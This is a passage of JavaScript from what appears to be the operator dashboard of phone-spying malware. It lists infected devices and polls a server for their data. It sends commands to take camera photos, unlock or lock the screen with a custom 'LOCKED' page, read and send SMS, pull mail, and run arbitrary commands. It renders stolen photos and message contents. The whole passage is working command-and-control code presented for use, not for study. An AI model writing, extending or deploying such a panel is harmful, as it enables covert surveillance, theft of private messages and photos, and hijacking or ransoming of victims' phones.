      const search = ($('searchDevices')?.value || '').toLowerCase().trim();
      const ids = Object.keys(clients);
      const online = ids.filter(id => clients[id].status === 'online');
      $('deviceCount').textContent = `${online.length} online`;

      if (ids.length === 0) {
        $('deviceList').innerHTML = `<div class="text-[#6B6B6B] text-sm py-6 text-center">No devices connected</div>`;
        return;
      }

      let filtered = ids;
      if (search) {
        filtered = ids.filter(id => {
          const c = clients[id];
          return (c.hostname || '').toLowerCase().includes(search) ||
                 (c.os || '').toLowerCase().includes(search) ||
                 id.toLowerCase().includes(search);
        });
      }

      let html = '';
      for (const id of filtered) {
        const c = clients[id];
        const active = id === selectedClient ? 'active' : '';
        const status = c.status === 'online' ? 'online' : 'offline';
        const label = c.hostname || id.slice(0, 8);
        const bat = c.battery || 0;
        html += `
          <div class="device-card ${status} ${active}" data-id="${id}">
            <span class="status-dot ${status}"></span>
            <div class="flex-1 min-w-0">
              <div class="font-semibold text-sm truncate">${escH(label)}</div>
              <div class="text-xs text-[#6B6B6B] truncate">${escH(c.os || 'unknown')}</div>
            </div>
            ${bat > 0 ? batterySVG(bat) : ''}
            <span class="text-[10px] text-[#A0A0A0]">${status === 'online' ? 'online' : ''}</span>
          </div>
        `;
      }
      $('deviceList').innerHTML = html || `<div class="text-[#6B6B6B] text-sm py-6 text-center">No matching devices</div>`;

      document.querySelectorAll('.device-card').forEach(el => {
        el.addEventListener('click', () => {
          const id = el.dataset.id;
          if (clients[id] && clients[id].status === 'online') {
            selectedClient = id;
            renderDevices();
            $('selectedDeviceName').textContent = clients[id].hostname || id.slice(0,8);
            $('selectedDeviceLabel').textContent = `Selected: ${clients[id].hostname || id.slice(0,8)}`;
            $('statusChip').textContent = 'Connected';
            fetchResults(id);
          } else {
            notify('warn', 'Offline', 'Device is not online.');
          }
        });
      });

      if (selectedClient && clients[selectedClient]) {
        const name = clients[selectedClient].hostname || selectedClient.slice(0,8);
        $('selectedDeviceName').textContent = name;
        $('selectedDeviceLabel').textContent = `Selected: ${name}`;
        $('statusChip').textContent = 'Connected';
      } else {
        selectedClient = null;
        $('selectedDeviceName').textContent = 'none';
        $('selectedDeviceLabel').textContent = 'No device selected';
        $('statusChip').textContent = 'Ready';
      }
    }

    // --- RESULTS ---
    async function fetchResults(clientId) {
      if (!clientId) return;
      try {
        const after = lastResultId[clientId] || 0;
        const data = await api(`results&clientId=${clientId}&after=${after}`);
        for (const r of data) {
          // Check for photo
          let out = r.output || '(empty)';
          if (out && out.startsWith('{') && out.includes('"photo"')) {
            try {
              const pd = JSON.parse(out);
              if (pd.photo) {
                appendOutput(`📸 ${pd.camera || 'back'} photo received`, 'resp', clientId);
                const img = document.createElement('img');
                img.src = `data:image/jpeg;base64,${pd.photo}`;
                img.className = 'photo-preview';
                const area = $('outputArea');
                const line = document.createElement('div');
                line.className = 'resp';
                line.innerHTML = `<span class="ts">${new Date().toLocaleTimeString()}</span> <span class="sys">[${clientId.slice(0,6)}]</span> photo:`;
                line.appendChild(img);
                area.appendChild(line);
                area.scrollTop = area.scrollHeight;
                continue;
              }
            } catch (e) {}
          }
          // Check for SMS list
          if (out && out.startsWith('[') && out.includes('"from"')) {
            try {
              const smsList = JSON.parse(out);
              if (Array.isArray(smsList) && smsList.length) {
                appendOutput(`SMS: ${smsList.length} messages`, 'resp', clientId);
                smsList.slice(0, 5).forEach(s => {
                  appendOutput(`  ${s.from}: ${s.body?.slice(0,60) || ''}`, 'resp', clientId);
                });
                if (smsList.length > 5) appendOutput(`  ... +${smsList.length-5} more`, 'resp', clientId);
                continue;
              } else if (Array.isArray(smsList)) {
                appendOutput('SMS: no messages', 'resp', clientId);
                continue;
              }
            } catch (e) {}
          }
          // Check for mail list
          if (out && out.startsWith('[') && out.includes('"subject"')) {
            try {
              const mailList = JSON.parse(out);
              if (Array.isArray(mailList) && mailList.length) {
                appendOutput(`Mail: ${mailList.length} messages`, 'resp', clientId);
                mailList.slice(0, 5).forEach(m => {
                  appendOutput(`  ${m.from}: ${m.subject?.slice(0,40) || ''}`, 'resp', clientId);
                });
                if (mailList.length > 5) appendOutput(`  ... +${mailList.length-5} more`, 'resp', clientId);
                continue;
              } else if (Array.isArray(mailList)) {
                appendOutput('Mail: no messages', 'resp', clientId);
                continue;
              }
            } catch (e) {}
          }
          appendOutput(out, r.error ? 'err' : 'resp', clientId);
          if (r.commandId > (lastResultId[clientId] || 0)) {
            lastResultId[clientId] = r.commandId;
          }
        }
      } catch (e) {
        appendOutput(`fetch results: ${e.message}`, 'err');
      }
    }

    // --- SEND COMMANDS ---
    async function sendCommand(clientId, command, params = {}) {
      if (!clientId) { notify('warn', 'No Device', 'Select a device first.'); return; }
      try {
        await api('command', { clientId, command, params }, 'POST');
        appendOutput(`${command} ${JSON.stringify(params)}`, 'cmd', clientId);
        notify('success', 'Command Sent', `${command} queued`);
      } catch (e) {
        appendOutput(`send failed: ${e.message}`, 'err');
        notify('error', 'Command Failed', e.message);
      }
    }

    function sendFlash(action) { sendCommand(selectedClient, 'flash', { action }); }
    function sendCamera(cam) { sendCommand(selectedClient, 'camera', { camera: cam }); }
    function sendUnlock() { sendCommand(selectedClient, 'unlock_screen', {}); }
    function sendLcd(effect) { sendCommand(selectedClient, 'lcd_effect', { effect }); }
    function sendFetchSms() { sendCommand(selectedClient, 'fetch_sms', {}); }
    function sendFetchMail() { sendCommand(selectedClient, 'fetch_mail', {}); }

    function sendLock() {
      const html = $('lockHtmlInput').value.trim() || '<div style="background:black;color:white;height:100vh;display:flex;align-items:center;justify-content:center;font-size:2rem;">LOCKED</div>';
      sendCommand(selectedClient, 'lock_screen', { html });
      closeModal('lockModal');
    }

    function sendSms() {
      const to = $('smsTo').value.trim();
      const body = $('smsBody').value.trim();
      if (!to || !body) { notify('warn', 'Missing Fields', 'Fill in number and message.'); return; }
      sendCommand(selectedClient, 'send_sms', { to, body });
      closeModal('smsModal');
    }

    function sendCustom() {
      const cmd = $('customCmd').value.trim();
      if (!cmd) return;
      sendCommand(selectedClient, cmd, {});
      $('customCmd').value = '';
    }

    // --- POLLING ---
    function startPolling() {
      if (pollInterval) clearInterval(pollInterval);
      pollInterval = setInterval(() => {
        fetchDevices();
        if (selectedClient) fetchResults(selectedClient);
      }, 2000);
    }

    // --- INIT ---
    document.addEventListener('DOMContentLoaded', () => {
      $('adminDevice').textContent = 'Pixel 8';
      startPolling();
      fetchDevices();
      appendOutput('system ready — waiting for devices', 'sys');

      // Enter key for custom command
      $('customCmd').addEventListener('keydown', e => {
        if (e.key === 'Enter') sendCustom();
      });
    });
  </script>
</body>
